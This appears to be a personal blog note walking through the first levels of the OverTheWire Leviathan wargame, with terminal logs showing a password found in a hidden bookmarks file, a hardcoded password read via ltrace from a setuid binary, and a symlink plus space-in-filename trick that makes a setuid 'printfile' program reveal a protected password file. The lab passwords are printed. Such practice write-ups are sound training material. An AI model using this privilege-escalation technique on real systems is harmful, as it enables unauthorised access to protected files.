---
layout: default
title: overthewire_wargames_notes_leviathan
categories:
- C++
tags:
- C++
---
//Description:

//Create Date: 2020-02-24 15:19:39

//Author: channy

# overthewire_wargames_notes_leviathan

> ssh -p2223 leviathan1@leviathan.labs.overthewire.org

[reference](https://jhalon.github.io/over-the-wire-leviathan/)

1. 我和小伙伴们都惊呆了~

```
leviathan0@leviathan:~$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```
2. ltrace, strace 

```
leviathan1@leviathan:~$ ls -lrht -a
total 28K
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
drwxr-xr-x 10 root       root       4.0K Aug 26 22:26 ..
-r-sr-x---  1 leviathan2 leviathan1 7.3K Aug 26 22:26 check
drwxr-xr-x  2 root       root       4.0K Aug 26 22:26 .
leviathan1@leviathan:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
leviathan1@leviathan:~$ ./check 
password: rioGegei8m
Wrong password, Good Bye ...
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd694, 0x8048610 <unfinished ...>
printf("password: ")                                       = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: 1111
)                      = 49
getchar(1, 0, 0x65766f6c, 0x646f6700)                      = 49
getchar(1, 0, 0x65766f6c, 0x646f6700)                      = 49
strcmp("111", "sex")                                       = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                       = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```
3. 没解出来

```
leviathan2@leviathan:~$ ls -lrht -a
total 28K
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
drwxr-xr-x 10 root       root       4.0K Aug 26 22:26 ..
drwxr-xr-x  2 root       root       4.0K Aug 26 22:26 .
-r-sr-x---  1 leviathan3 leviathan2 7.3K Aug 26 22:26 printfile
leviathan2@leviathan:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ltrace ./printfile /tmp/channy/test.txt
__libc_start_main(0x804852b, 2, 0xffffd674, 0x8048610 <unfinished ...>
access("/tmp/channy/test.txt", 4)                          = -1
puts("You cant have that file..."You cant have that file...
)                         = 27
+++ exited (status 1) +++
...
```

```
leviathan2@leviathan:/tmp/channy$ ln -s /etc/leviathan_pass/leviathan3 /tmp/channy/pass
leviathan2@leviathan:/tmp/channy$ ls -la
total 7864
drwxrwxr-x 2 leviathan2 leviathan2    4096 Sep 10 04:55 .
drwxrwx-wt 1 root       root       8036352 Sep 10 04:55 ..
lrwxrwxrwx 1 leviathan2 leviathan2      30 Sep 10 04:55 pass -> /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2       0 Sep 10 04:54 pass file.txt
leviathan2@leviathan:/tmp/channy$ ~/printfile "pass file.txt"
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
```
4. 

[back](/)

